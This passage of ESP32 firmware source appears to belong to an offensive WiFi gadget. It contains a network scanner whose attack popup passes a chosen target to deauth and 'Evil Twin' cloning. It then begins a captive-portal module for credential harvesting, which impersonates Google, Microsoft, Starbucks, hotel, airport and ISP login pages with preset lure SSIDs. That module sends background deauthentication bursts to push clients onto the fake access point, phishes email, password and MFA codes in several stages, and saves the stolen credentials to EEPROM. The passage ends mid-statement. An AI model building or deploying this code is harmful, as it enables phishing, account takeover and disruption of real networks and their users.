    tft.setTextSize(1);
    tft.setCursor(popupX + 10, popupY + 30);
    tft.print("SELECT ATTACK");

    // SSID (truncated)
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setTextSize(1);
    tft.setCursor(popupX + 10, popupY + 45);
    tft.print("Target: ");
    tft.print(ssid.substring(0, 14));
    if (ssid.length() > 14) tft.print("..");

    // Channel info
    tft.setCursor(popupX + 10, popupY + 58);
    tft.print("Ch: ");
    tft.print(WiFi.channel(realIdx));
    tft.print("  ");
    tft.print(WiFi.RSSI(realIdx));
    tft.print("dBm");

    // Buttons
    int btnY = popupY + 80;
    int btnW = 60;
    int btnH = 28;
    int btnSpacing = 10;
    int totalBtnW = (btnW * 3) + (btnSpacing * 2);
    int btnStartX = popupX + (popupW - totalBtnW) / 2;

    // DEAUTH button (skull icon + red)
    tft.fillRoundRect(btnStartX, btnY, btnW, btnH, 4, HALEHOUND_DARK);
    tft.drawRoundRect(btnStartX, btnY, btnW, btnH, 4, 0xF800);
    tft.drawBitmap(btnStartX + 5, btnY + 6, bitmap_icon_skull, 16, 16, 0xF800);
    tft.setTextColor(0xF800);
    tft.setTextSize(1);
    tft.setCursor(btnStartX + 24, btnY + 10);
    tft.print("DEA");

    // CLONE button (cyan)
    int cloneX = btnStartX + btnW + btnSpacing;
    tft.fillRoundRect(cloneX, btnY, btnW, btnH, 4, HALEHOUND_DARK);
    tft.drawRoundRect(cloneX, btnY, btnW, btnH, 4, HALEHOUND_MAGENTA);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(cloneX + 10, btnY + 10);
    tft.print("CLONE");

    // CANCEL button (gray)
    int cancelX = cloneX + btnW + btnSpacing;
    tft.fillRoundRect(cancelX, btnY, btnW, btnH, 4, HALEHOUND_DARK);
    tft.drawRoundRect(cancelX, btnY, btnW, btnH, 4, HALEHOUND_GUNMETAL);
    tft.setTextColor(HALEHOUND_GUNMETAL);
    tft.setCursor(cancelX + 12, btnY + 10);
    tft.print("BACK");

    // Info hint
    tft.setTextColor(HALEHOUND_VIOLET);
    tft.setCursor(popupX + 10, popupY + 120);
    tft.print("DEA=Deauth  CLONE=Evil Twin");
}

static bool handleAttackPopupTouch(uint16_t tx, uint16_t ty) {
    if (!attackPopupActive) return false;

    int popupX = 15;
    int popupY = 70;
    int popupW = SCREEN_WIDTH - 30;
    int btnY = popupY + 80;
    int btnW = 60;
    int btnH = 28;
    int btnSpacing = 10;
    int totalBtnW = (btnW * 3) + (btnSpacing * 2);
    int btnStartX = popupX + (popupW - totalBtnW) / 2;

    // Check Y range for buttons
    if (ty < btnY || ty > btnY + btnH) return false;

    int realIdx = sortedIndices[attackPopupIndex];

    // DEAUTH button
    if (tx >= btnStartX && tx <= btnStartX + btnW) {
        // Store target info
        strncpy(selectedSSID, WiFi.SSID(realIdx).c_str(), 32);
        selectedSSID[32] = '\0';
        strncpy(selectedBSSID, WiFi.BSSIDstr(realIdx).c_str(), 17);
        selectedBSSID[17] = '\0';
        selectedChannel = WiFi.channel(realIdx);
        deauthRequested = true;
        attackPopupActive = false;
        exitRequested = true;
        return true;
    }

    // CLONE button
    int cloneX = btnStartX + btnW + btnSpacing;
    if (tx >= cloneX && tx <= cloneX + btnW) {
        strncpy(selectedSSID, WiFi.SSID(realIdx).c_str(), 32);
        selectedSSID[32] = '\0';
        strncpy(selectedBSSID, WiFi.BSSIDstr(realIdx).c_str(), 17);
        selectedBSSID[17] = '\0';
        selectedChannel = WiFi.channel(realIdx);
        cloneRequested = true;
        attackPopupActive = false;
        exitRequested = true;
        return true;
    }

    // CANCEL button
    int cancelX = cloneX + btnW + btnSpacing;
    if (tx >= cancelX && tx <= cancelX + btnW) {
        attackPopupActive = false;
        attackPopupIndex = -1;
        drawList();
        return true;
    }

    return false;
}

// ═══════════════════════════════════════════════════════════════════════════
// UI DRAWING
// ═══════════════════════════════════════════════════════════════════════════

static void drawWifiScanUI() {
#define WS_ICON_SIZE 16
    int iconY = 20;

    // Icon bar background
    tft.fillRect(0, 20, SCREEN_WIDTH, 16, HALEHOUND_DARK);

    // Back icon
    tft.drawBitmap(10, iconY, bitmap_icon_go_back, WS_ICON_SIZE, WS_ICON_SIZE, HALEHOUND_MAGENTA);

    // Sort button (x=40) - show current sort mode
    tft.setTextSize(1);
    tft.setCursor(40, iconY + 4);
    switch (currentSort) {
        case SORT_RSSI:
            tft.setTextColor(0x07E0, HALEHOUND_DARK);  // Green
            tft.print("SIG");
            break;
        case SORT_CHANNEL:
            tft.setTextColor(0xFFE0, HALEHOUND_DARK);  // Yellow
            tft.print("CH");
            break;
        case SORT_ENC:
            tft.setTextColor(HALEHOUND_HOTPINK, HALEHOUND_DARK);
            tft.print("ENC");
            break;
        case SORT_ALPHA:
            tft.setTextColor(HALEHOUND_MAGENTA, HALEHOUND_DARK);
            tft.print("A-Z");
            break;
    }

    // Filter button (x=80) - show current filter
    tft.setCursor(80, iconY + 4);
    switch (currentFilter) {
        case FILT_ALL:
            tft.setTextColor(HALEHOUND_MAGENTA, HALEHOUND_DARK);
            tft.print("ALL");
            break;
        case FILT_OPEN:
            tft.setTextColor(0x07E0, HALEHOUND_DARK);  // Green = OPEN (danger!)
            tft.print("OPN");
            break;
        case FILT_WEP:
            tft.setTextColor(0xFD20, HALEHOUND_DARK);  // Orange
            tft.print("WEP");
            break;
        case FILT_WPA:
            tft.setTextColor(HALEHOUND_HOTPINK, HALEHOUND_DARK);
            tft.print("WPA");
            break;
    }

    // Network count (x=120)
    tft.setCursor(120, iconY + 4);
    tft.setTextColor(HALEHOUND_BRIGHT, HALEHOUND_DARK);
    tft.print(filteredCount);
    tft.print("/");
    tft.print(networkCount);

    // Wardriving toggle (x=170)
    uint16_t wdColor = wardrivingEnabled ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL;
    tft.drawBitmap(170, iconY, bitmap_icon_antenna, WS_ICON_SIZE, WS_ICON_SIZE, wdColor);

    // Rescan icon (x=200) - skull_tools for style!
    tft.drawBitmap(200, iconY, bitmap_icon_skull_tools, WS_ICON_SIZE, WS_ICON_SIZE, HALEHOUND_MAGENTA);

    // Separator line
    tft.drawLine(0, 36, SCREEN_WIDTH, 36, HALEHOUND_HOTPINK);
}

// Glitch title
static void drawHeader() {
    drawGlitchText(55, "WIFI SCAN", &Nosifer_Regular10pt7b);
}

// Draw network list with signal bars and encryption badges
static void drawList() {
    tft.fillRect(0, 38, SCREEN_WIDTH, SCREEN_HEIGHT - 38, HALEHOUND_BLACK);
    drawWifiScanUI();
    drawHeader();

    networkCount = WiFi.scanComplete();

    if (networkCount <= 0) {
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(10, 78);
        tft.print("No networks found");
        tft.setCursor(10, 98);
        tft.print("Tap skull to scan");
        return;
    }

    // Apply sort and filter
    sortAndFilterNetworks();

    if (filteredCount == 0) {
        tft.setTextColor(HALEHOUND_HOTPINK);
        tft.setCursor(10, 78);
        tft.print("No matches for filter");
        tft.setCursor(10, 98);
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.print("Tap filter to change");
        return;
    }

    // Wardriving status line
    int headerY = 60;
    if (wardrivingEnabled) {
        WardrivingStats wdStats = wardrivingGetStats();
        tft.setCursor(5, headerY);
        if (wdStats.gpsReady) {
            tft.setTextColor(HALEHOUND_HOTPINK);
            tft.print("WD ACTIVE ");
        } else {
            tft.setTextColor(HALEHOUND_GUNMETAL);
            tft.print("WD NO GPS ");
        }
        tft.print(wdStats.newNetworks);
        tft.print(" new");
    } else {
        tft.setTextColor(HALEHOUND_VIOLET);
        tft.setCursor(5, headerY);
        tft.print("Tap network to attack");
    }

    // Clamp indices
    if (currentIndex >= filteredCount) currentIndex = filteredCount - 1;
    if (currentIndex < 0) currentIndex = 0;
    if (listStartIndex > currentIndex) listStartIndex = currentIndex;
    if (listStartIndex + MAX_VISIBLE_ITEMS <= currentIndex) {
        listStartIndex = currentIndex - MAX_VISIBLE_ITEMS + 1;
    }

    int y = 74;
    for (int i = 0; i < MAX_VISIBLE_ITEMS && i + listStartIndex < filteredCount; i++) {
        int dispIdx = i + listStartIndex;
        int realIdx = sortedIndices[dispIdx];

        String ssid = WiFi.SSID(realIdx);
        if (ssid.length() == 0) ssid = "(Hidden)";
        int rssi = WiFi.RSSI(realIdx);
        int enc = WiFi.encryptionType(realIdx);
        int ch = WiFi.channel(realIdx);

        // Selection highlight
        if (dispIdx == currentIndex) {
            tft.fillRect(0, y - 1, SCREEN_WIDTH, LIST_ITEM_HEIGHT, HALEHOUND_DARK);
            tft.setTextColor(HALEHOUND_HOTPINK);
        } else {
            tft.setTextColor(HALEHOUND_MAGENTA);
        }

        // Encryption badge (2 chars)
        tft.setCursor(3, y + 2);
        if (enc == WIFI_AUTH_OPEN) {
            tft.setTextColor(0x07E0);  // Green = OPEN
            tft.print("OP");
        } else if (enc == WIFI_AUTH_WEP) {
            tft.setTextColor(0xFD20);  // Orange = WEP
            tft.print("WE");
        } else {
            tft.setTextColor(dispIdx == currentIndex ? HALEHOUND_HOTPINK : HALEHOUND_MAGENTA);
            tft.print("WP");
        }

        // SSID (truncated)
        tft.setCursor(22, y + 2);
        tft.setTextColor(dispIdx == currentIndex ? HALEHOUND_HOTPINK : HALEHOUND_BRIGHT);
        String dispSSID = ssid.substring(0, 11);
        tft.print(dispSSID);
        if (ssid.length() > 11) tft.print("..");

        // Channel
        tft.setCursor(150, y + 2);
        tft.setTextColor(dispIdx == currentIndex ? HALEHOUND_HOTPINK : HALEHOUND_VIOLET);
        if (ch < 10) tft.print(" ");
        tft.print(ch);

        // Signal bars
        drawSignalBars(SCREEN_WIDTH - 22, y + 2, rssi);

        y += LIST_ITEM_HEIGHT;
    }

    // PREV/NEXT buttons at bottom if more networks than visible
    if (filteredCount > MAX_VISIBLE_ITEMS) {
        int btnY = SCREEN_HEIGHT - 22;
        int btnW = 50;
        int btnH = 18;

        // Page indicator
        int currentPage = (listStartIndex / MAX_VISIBLE_ITEMS) + 1;
        int totalPages = ((filteredCount - 1) / MAX_VISIBLE_ITEMS) + 1;
        tft.setTextColor(HALEHOUND_BRIGHT);
        tft.setCursor(SCREEN_WIDTH/2 - 20, btnY + 5);
        tft.print(currentPage);
        tft.print("/");
        tft.print(totalPages);

        // PREV button (left side)
        if (listStartIndex > 0) {
            tft.fillRoundRect(10, btnY, btnW, btnH, 3, HALEHOUND_DARK);
            tft.drawRoundRect(10, btnY, btnW, btnH, 3, HALEHOUND_MAGENTA);
            tft.setTextColor(HALEHOUND_MAGENTA);
            tft.setCursor(18, btnY + 5);
            tft.print("PREV");
        }

        // NEXT button (right side)
        if (listStartIndex + MAX_VISIBLE_ITEMS < filteredCount) {
            tft.fillRoundRect(SCREEN_WIDTH - btnW - 10, btnY, btnW, btnH, 3, HALEHOUND_DARK);
            tft.drawRoundRect(SCREEN_WIDTH - btnW - 10, btnY, btnW, btnH, 3, HALEHOUND_HOTPINK);
            tft.setTextColor(HALEHOUND_HOTPINK);
            tft.setCursor(SCREEN_WIDTH - btnW + 2, btnY + 5);
            tft.print("NEXT");
        }
    }
}

// Draw detail view for selected network
static void drawDetails() {
    tft.fillRect(0, STATUS_BAR_HEIGHT + 16, SCREEN_WIDTH, SCREEN_HEIGHT - STATUS_BAR_HEIGHT - 16, HALEHOUND_BLACK);
    drawWifiScanUI();
    drawHeader();

    String ssid = WiFi.SSID(currentIndex);
    String bssid = WiFi.BSSIDstr(currentIndex);
    int rssi = WiFi.RSSI(currentIndex);
    int channel = WiFi.channel(currentIndex);
    int enc = WiFi.encryptionType(currentIndex);

    float signalQuality = constrain(2 * (rssi + 100), 0, 100);
    float distance = pow(10.0, (-69.0 - rssi) / (10.0 * 2.0));

    String encType;
    switch (enc) {
        case WIFI_AUTH_OPEN: encType = "Open"; break;
        case WIFI_AUTH_WEP: encType = "WEP"; break;
        case WIFI_AUTH_WPA_PSK: encType = "WPA"; break;
        case WIFI_AUTH_WPA2_PSK: encType = "WPA2"; break;
        case WIFI_AUTH_WPA_WPA2_PSK: encType = "WPA/WPA2"; break;
        case WIFI_AUTH_WPA2_ENTERPRISE: encType = "WPA2-Ent"; break;
        default: encType = "Unknown"; break;
    }

    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(5, 60);
    tft.print("Network Details");

    tft.setTextColor(HALEHOUND_BRIGHT);
    int y = 78;

    tft.setCursor(10, y); tft.print("SSID: "); tft.print(ssid.length() ? ssid : "(Hidden)");
    y += 18;
    tft.setCursor(10, y); tft.print("BSSID: "); tft.print(bssid);
    y += 18;
    tft.setCursor(10, y); tft.print("RSSI: "); tft.print(rssi); tft.print(" dBm");
    y += 18;
    tft.setCursor(10, y); tft.print("Signal: "); tft.print(signalQuality, 0); tft.print("%");
    y += 18;
    tft.setCursor(10, y); tft.print("Channel: "); tft.print(channel);
    y += 18;
    tft.setCursor(10, y); tft.print("Encrypt: "); tft.print(encType);
    y += 18;
    tft.setCursor(10, y); tft.print("Distance: ~"); tft.print(distance, 1); tft.print("m");

    tft.setTextColor(HALEHOUND_VIOLET);
    tft.setCursor(5, SCREEN_HEIGHT - 12);
    tft.print("BACK=Return to list");
}

// Start scan animation
static void showScanning() {
    tft.fillRect(0, STATUS_BAR_HEIGHT + 16, SCREEN_WIDTH, SCREEN_HEIGHT - STATUS_BAR_HEIGHT - 16, HALEHOUND_BLACK);
    drawWifiScanUI();
    drawHeader();
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, 78);
    tft.print("[*] Scanning...");
}

void startScan() {
    showScanning();
    isScanning = true;

    WiFi.mode(WIFI_STA);
    WiFi.disconnect();

    int n = WiFi.scanNetworks(false, true);
    networkCount = n;
    currentIndex = 0;
    listStartIndex = 0;

    // Apply sort and filter
    sortAndFilterNetworks();

    // Log to wardriving if enabled
    if (wardrivingEnabled && networkCount > 0) {
        gpsUpdate();  // Get fresh GPS data
        for (int i = 0; i < networkCount; i++) {
            wardrivingLogNetwork(
                WiFi.BSSID(i),
                WiFi.SSID(i).c_str(),
                WiFi.RSSI(i),
                WiFi.channel(i),
                WiFi.encryptionType(i)
            );
        }
    }

    isScanning = false;
    drawList();
}

void setup() {
    #if CYD_DEBUG
    Serial.println("[WIFISCAN] Setup v2.0...");
    #endif

    // Always redraw screen on entry
    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();

    // Reset state
    detailView = false;
    exitRequested = false;
    attackPopupActive = false;
    attackPopupIndex = -1;
    deauthRequested = false;
    cloneRequested = false;
    selectedSSID[0] = '\0';
    selectedBSSID[0] = '\0';
    selectedChannel = 0;

    // Keep sort/filter settings between scans (user preference)
    // currentSort and currentFilter persist

    // Always scan on entry
    startScan();

    if (initialized) return;
    initialized = true;

    #if CYD_DEBUG
    Serial.println("[WIFISCAN] Initialized");
    #endif
}

void loop() {
    if (!initialized) return;

    // ═══════════════════════════════════════════════════════════════════════
    // ATTACK POPUP HANDLING
    // ═══════════════════════════════════════════════════════════════════════
    if (attackPopupActive) {
        uint16_t tx, ty;
        if (getTouchPoint(&tx, &ty)) {
            while (isTouched()) { delay(10); }
            handleAttackPopupTouch(tx, ty);
        }
        return;
    }

    // ═══════════════════════════════════════════════════════════════════════
    // ICON BAR TOUCH HANDLING
    // Layout: [BACK x=10] [SORT x=40] [FILT x=80] [WD x=170] [SCAN x=200]
    // ═══════════════════════════════════════════════════════════════════════
    static unsigned long lastIconTap = 0;
    if (millis() - lastIconTap > 200) {
        uint16_t tx, ty;
        if (getTouchPoint(&tx, &ty)) {
            // Icon bar area (y=18-40)
            if (ty >= 18 && ty <= 40) {
                while (isTouched()) { delay(10); }
                lastIconTap = millis();

                // Back icon (x=5-30)
                if (tx >= 5 && tx <= 30) {
                    if (detailView) {
                        detailView = false;
                        drawList();
                    } else {
                        exitRequested = true;
                    }
                    return;
                }
                // Sort button (x=35-65)
                else if (tx >= 35 && tx <= 70) {
                    currentSort = (SortMode)((currentSort + 1) % 4);
                    sortAndFilterNetworks();
                    currentIndex = 0;
                    listStartIndex = 0;
                    drawList();
                    return;
                }
                // Filter button (x=75-115)
                else if (tx >= 75 && tx <= 115) {
                    currentFilter = (FilterMode)((currentFilter + 1) % 4);
                    sortAndFilterNetworks();
                    currentIndex = 0;
                    listStartIndex = 0;
                    drawList();
                    return;
                }
                // Wardriving toggle (x=165-190)
                else if (tx >= 165 && tx <= 190) {
                    wardrivingEnabled = !wardrivingEnabled;
                    if (wardrivingEnabled && !wardrivingIsActive()) {
                        gpsSetup();
                        if (!wardrivingStart()) {
                            wardrivingEnabled = false;
                            tft.fillRect(30, 100, 180, 50, HALEHOUND_DARK);
                            tft.drawRect(30, 100, 180, 50, HALEHOUND_HOTPINK);
                            tft.setTextColor(HALEHOUND_HOTPINK);
                            tft.setCursor(50, 115);
                            tft.print("SD CARD ERROR!");
                            tft.setCursor(40, 130);
                            tft.setTextColor(HALEHOUND_MAGENTA);
                            tft.print("Check SD and retry");
                            delay(2000);
                        }
                    } else if (!wardrivingEnabled && wardrivingIsActive()) {
                        wardrivingStop();
                    }
                    drawList();
                    return;
                }
                // Rescan skull icon (x=195-220)
                else if (tx >= 195 && tx <= 220) {
                    if (!detailView) {
                        startScan();
                    }
                    return;
                }
            }
        }
    }

    touchButtonsUpdate();

    // ═══════════════════════════════════════════════════════════════════════
    // DETAIL VIEW HANDLING
    // ═══════════════════════════════════════════════════════════════════════
    if (detailView) {
        if (buttonPressed(BTN_BACK) || buttonPressed(BTN_LEFT)) {
            detailView = false;
            drawList();
        }
        return;
    }

    // ═══════════════════════════════════════════════════════════════════════
    // LIST VIEW HANDLING
    // ═══════════════════════════════════════════════════════════════════════

    // Hardware buttons
    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
        exitRequested = true;
        return;
    }

    if (buttonPressed(BTN_UP) && currentIndex > 0) {
        currentIndex--;
        if (currentIndex < listStartIndex) listStartIndex--;
        drawList();
    }

    if (buttonPressed(BTN_DOWN) && currentIndex < filteredCount - 1) {
        currentIndex++;
        if (currentIndex >= listStartIndex + MAX_VISIBLE_ITEMS) listStartIndex++;
        drawList();
    }

    if (buttonPressed(BTN_SELECT) || buttonPressed(BTN_RIGHT)) {
        if (filteredCount > 0) {
            showAttackPopup(currentIndex);
        }
    }

    if (buttonPressed(BTN_LEFT)) {
        startScan();
    }

    // ═══════════════════════════════════════════════════════════════════════
    // TOUCH HANDLING
    // ═══════════════════════════════════════════════════════════════════════
    uint16_t tx, ty;
    if (getTouchPoint(&tx, &ty)) {
        // Wait for touch release to avoid double-tap
        while (isTouched()) { delay(10); }

        // PREV/NEXT buttons at bottom (only if pagination active)
        if (filteredCount > MAX_VISIBLE_ITEMS && ty >= SCREEN_HEIGHT - 22) {
            int btnW = 50;

            // PREV button (left side, x=10 to 60)
            if (tx >= 10 && tx <= 10 + btnW && listStartIndex > 0) {
                listStartIndex -= MAX_VISIBLE_ITEMS;
                if (listStartIndex < 0) listStartIndex = 0;
                currentIndex = listStartIndex;
                drawList();
                return;
            }

            // NEXT button (right side, x=180 to 230)
            if (tx >= SCREEN_WIDTH - btnW - 10 && tx <= SCREEN_WIDTH - 10) {
                if (listStartIndex + MAX_VISIBLE_ITEMS < filteredCount) {
                    listStartIndex += MAX_VISIBLE_ITEMS;
                    currentIndex = listStartIndex;
                    drawList();
                    return;
                }
            }
        }

        // Network list area (y=74 to bottom minus button area)
        int listBottom = (filteredCount > MAX_VISIBLE_ITEMS) ? SCREEN_HEIGHT - 24 : SCREEN_HEIGHT - 10;
        if (ty >= 74 && ty < listBottom) {
            int tappedIdx = (ty - 74) / LIST_ITEM_HEIGHT;
            if (tappedIdx >= 0 && tappedIdx < MAX_VISIBLE_ITEMS) {
                int actualIdx = listStartIndex + tappedIdx;
                if (actualIdx < filteredCount) {
                    currentIndex = actualIdx;
                    showAttackPopup(actualIdx);
                }
            }
        }
    }
}

int getNetworkCount() { return networkCount; }
int getFilteredCount() { return filteredCount; }
String getSSID(int index) { return WiFi.SSID(index); }
String getBSSID(int index) { return WiFi.BSSIDstr(index); }
int getRSSI(int index) { return WiFi.RSSI(index); }
int getChannel(int index) { return WiFi.channel(index); }
int getEncryption(int index) { return WiFi.encryptionType(index); }

String getEncryptionString(int index) {
    switch (WiFi.encryptionType(index)) {
        case WIFI_AUTH_OPEN: return "Open";
        case WIFI_AUTH_WEP: return "WEP";
        case WIFI_AUTH_WPA_PSK: return "WPA";
        case WIFI_AUTH_WPA2_PSK: return "WPA2";
        case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2";
        case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-Ent";
        default: return "Unknown";
    }
}

float getEstimatedDistance(int index) {
    int rssi = WiFi.RSSI(index);
    return pow(10.0, (-69.0 - rssi) / (10.0 * 2.0));
}

float getSignalQuality(int index) {
    int rssi = WiFi.RSSI(index);
    return constrain(2 * (rssi + 100), 0, 100);
}

bool isExitRequested() { return exitRequested; }

// ═══════════════════════════════════════════════════════════════════════════
// ATTACK HANDOFF FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════

const char* getSelectedSSID() { return selectedSSID; }
const char* getSelectedBSSID() { return selectedBSSID; }
int getSelectedChannel() { return selectedChannel; }
bool isDeauthRequested() { return deauthRequested; }
bool isCloneRequested() { return cloneRequested; }

void clearAttackRequest() {
    deauthRequested = false;
    cloneRequested = false;
    selectedSSID[0] = '\0';
    selectedBSSID[0] = '\0';
    selectedChannel = 0;
}

void cleanup() {
    WiFi.scanDelete();
    WiFi.disconnect();
    initialized = false;
    exitRequested = false;
    attackPopupActive = false;
    // Don't clear attack request here - needed for handoff

    #if CYD_DEBUG
    Serial.println("[WIFISCAN] Cleanup complete");
    #endif
}

}  // namespace WifiScan



// ═══════════════════════════════════════════════════════════════════════════
// CAPTIVE PORTAL IMPLEMENTATION - GARMR-Style Evil Twin
// Multi-template credential harvesting with real-time CYD display
// Templates: WiFi, Google, Microsoft, Starbucks, Hotel, Airport
// Created: 2026-02-14
// ═══════════════════════════════════════════════════════════════════════════

namespace CaptivePortal {

#include "portal_pages.h"

// ═══════════════════════════════════════════════════════════════════════════
// EEPROM LAYOUT
// Addr 0-31:    SSID (32 bytes)
// Addr 32:      Template index (1 byte)
// Addr 33:      Credential count (1 byte)
// Addr 34-1313: Credentials (20 * 64 bytes)
// ═══════════════════════════════════════════════════════════════════════════

#define EEPROM_SIZE 1320
#define SSID_ADDR 0
#define TMPL_ADDR 32
#define COUNT_ADDR 33
#define CRED_ADDR 34
#define MAX_CREDS 20
#define CRED_SIZE 64

// ═══════════════════════════════════════════════════════════════════════════
// STATE VARIABLES
// ═══════════════════════════════════════════════════════════════════════════

static bool initialized = false;
static bool exitRequested = false;
static bool portalActive = false;

static char customSSID[32] = "FreeWiFi";
static const char* defaultSSID = "FreeWiFi";

// Background deauth — kicks clients off real AP onto our evil twin
static uint8_t targetBSSID[6] = {0};
static uint8_t targetChannel = 1;
static bool hasTarget = false;
static bool bgDeauthActive = false;
static unsigned long lastBgDeauth = 0;
#define CP_DEAUTH_BURST    30       // Frames per burst (proven effective)
#define CP_DEAUTH_INTERVAL 3000     // 3s between bursts (enough listen time)

static DNSServer dnsServer;
static WebServer server(80);

static Screen currentScreen = SCREEN_MAIN;
static PortalTemplate currentTemplate = TMPL_WIFI;
static String inputSSID = "";
static int credPage = 0;
static int totalClients = 0;
static int prevClientCount = 0;

// Multi-stage temp storage (last-one-wins for concurrent clients)
static char capturedEmail[32] = {0};

// Touch-release tracking (prevents held finger from firing multiple actions)
static bool waitForReleaseFlag = false;

// ═══════════════════════════════════════════════════════════════════════════
// KEYBOARD VARIABLES
// ═══════════════════════════════════════════════════════════════════════════

static bool keyboardActive = false;
static bool shiftActive = false;
static bool cursorState = false;
static unsigned long lastCursorToggle = 0;
static const int keyWidth = 22;
static const int keyHeight = 18;
static const int keySpacing = 2;
static const char* keyboardLower[] = {
    "1234567890",
    "qwertyuiop",
    "asdfghjkl^",
    "zxcvbnm_<-"
};
static const char* keyboardUpper[] = {
    "1234567890",
    "QWERTYUIOP",
    "ASDFGHJKL^",
    "ZXCVBNM_<-"
};
static const char** keyboardLayout = keyboardLower;

// ═══════════════════════════════════════════════════════════════════════════
// TERMINAL DISPLAY
// ═══════════════════════════════════════════════════════════════════════════

#define TERM_MAX_LINES 14
#define TERM_LINE_HEIGHT 13
#define TERM_Y_START 90
#define TERM_Y_END 272
static String terminalBuffer[TERM_MAX_LINES];
static uint16_t colorBuffer[TERM_MAX_LINES];
static int lineCount = 0;

// ═══════════════════════════════════════════════════════════════════════════
// ICON BAR CONFIGURATION (6 icons)
// ═══════════════════════════════════════════════════════════════════════════

#define CP_ICON_SIZE 16
#define CP_ICON_NUM 6
static const int iconX[CP_ICON_NUM] = {10, 55, 100, 135, 175, 215};
static const int iconY = 20;

// ═══════════════════════════════════════════════════════════════════════════
// FORWARD DECLARATIONS
// ═══════════════════════════════════════════════════════════════════════════

static void drawMainScreen();
static void drawIconBar();
static void drawHeader();
static void drawInfo();
static void drawTerminal();
static void drawStats();
static void drawButtonBar();
static void drawKeyboard();
static void handleKeyboard(int x, int y);
static void drawCredList();

// ═══════════════════════════════════════════════════════════════════════════
// AUTO-SSID-TO-TEMPLATE MATCHING
// ═══════════════════════════════════════════════════════════════════════════

static PortalTemplate autoSelectTemplate(const char* ssid) {
    String s = String(ssid);
    s.toLowerCase();

    if (s.indexOf("google") >= 0 || s.indexOf("workspace") >= 0) return TMPL_GOOGLE;
    if (s.indexOf("microsoft") >= 0 || s.indexOf("office") >= 0 ||
        s.indexOf("azure") >= 0 || s.indexOf("outlook") >= 0) return TMPL_MICROSOFT;
    if (s.indexOf("starbucks") >= 0 || s.indexOf("sbux") >= 0) return TMPL_STARBUCKS;
    if (s.indexOf("hotel") >= 0 || s.indexOf("marriott") >= 0 ||
        s.indexOf("hilton") >= 0 || s.indexOf("hyatt") >= 0) return TMPL_HOTEL;
    if (s.indexOf("airport") >= 0 || s.indexOf("terminal") >= 0 ||
        s.indexOf("airline") >= 0) return TMPL_AIRPORT;
    if (s.indexOf("att") >= 0 || s.indexOf("at&t") >= 0) return TMPL_ATT;
    if (s.indexOf("mcdonald") >= 0 || s.indexOf("mcdonalds") >= 0) return TMPL_MCDONALDS;
    if (s.indexOf("xfinity") >= 0 || s.indexOf("comcast") >= 0) return TMPL_XFINITY;

    return TMPL_WIFI;
}

// Preset SSIDs per template — auto-set when cycling templates
static const char* const templateSSIDs[] = {
    "FreeWiFi",           // TMPL_WIFI
    "Google Guest",       // TMPL_GOOGLE
    "Microsoft WiFi",     // TMPL_MICROSOFT
    "Starbucks WiFi",     // TMPL_STARBUCKS
    "Hotel Guest WiFi",   // TMPL_HOTEL
    "Airport Free WiFi",  // TMPL_AIRPORT
    "ATT WiFi",           // TMPL_ATT
    "McDonald's WiFi",    // TMPL_MCDONALDS
    "Xfinity WiFi"        // TMPL_XFINITY
};

// ═══════════════════════════════════════════════════════════════════════════
// TEMPLATE PAGE SELECTION
// Returns PROGMEM pointer for template + stage combination
// ═══════════════════════════════════════════════════════════════════════════

static const char* getPortalPage(PortalTemplate tmpl, const char* stage) {
    // Multi-stage templates (Google/Microsoft)
    if (stage && strlen(stage) > 0) {
        if (strcmp(stage, "password") == 0) {
            if (tmpl == TMPL_GOOGLE) return portal_google_password;
            if (tmpl == TMPL_MICROSOFT) return portal_microsoft_password;
        } else if (strcmp(stage, "mfa") == 0) {
            if (tmpl == TMPL_GOOGLE) return portal_google_mfa;
            if (tmpl == TMPL_MICROSOFT) return portal_microsoft_mfa;
        }
    }

    // First stage / single-stage templates
    switch (tmpl) {
        case TMPL_WIFI:      return portal_wifi;
        case TMPL_GOOGLE:    return portal_google_email;
        case TMPL_MICROSOFT: return portal_microsoft_email;
        case TMPL_STARBUCKS: return portal_starbucks;
        case TMPL_HOTEL:     return portal_hotel;
        case TMPL_AIRPORT:   return portal_airport;
        case TMPL_ATT:       return portal_att;
        case TMPL_MCDONALDS: return portal_mcdonalds;
        case TMPL_XFINITY:   return portal_xfinity;
        default:             return portal_wifi;
    }
}

// Check if template supports multi-stage flow
static bool isMultiStage(PortalTemplate tmpl) {
    return (tmpl == TMPL_GOOGLE || tmpl == TMPL_MICROSOFT);
}

// ═══════════════════════════════════════════════════════════════════════════
// TERMINAL OUTPUT
// ═══════════════════════════════════════════════════════════════════════════

static void terminalPrint(String text, uint16_t color) {
    // Scroll up if buffer full
    if (lineCount >= TERM_MAX_LINES) {
        for (int i = 0; i < TERM_MAX_LINES - 1; i++) {
            terminalBuffer[i] = terminalBuffer[i + 1];
            colorBuffer[i] = colorBuffer[i + 1];
        }
        lineCount = TERM_MAX_LINES - 1;
    }

    terminalBuffer[lineCount] = text;
    colorBuffer[lineCount] = color;
    lineCount++;

    // Only redraw if on main screen
    if (currentScreen == SCREEN_MAIN || currentScreen == SCREEN_PORTAL_ACTIVE) {
        drawTerminal();
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// CREDENTIAL STORAGE
// ═══════════════════════════════════════════════════════════════════════════

static void saveCredential(const char* email, const char* password, const char* mfa) {
    Credential cred;
    memset(&cred, 0, sizeof(cred));
    if (email) strncpy(cred.email, email, 31);
    if (password) strncpy(cred.password, password, 23);
    if (mfa) strncpy(cred.mfa, mfa, 7);

    int count = EEPROM.read(COUNT_ADDR);
    if (count >= MAX_CREDS) count = MAX_CREDS - 1;  // Overwrite last if full

    int addr = CRED_ADDR + (count * CRED_SIZE);
    EEPROM.put(addr, cred);
    if (count < MAX_CREDS) count++;
    EEPROM.write(COUNT_ADDR, count);
    EEPROM.commit();

    #if CYD_DEBUG
    Serial.printf("[PORTAL] Saved cred: %s / %s / %s\n",
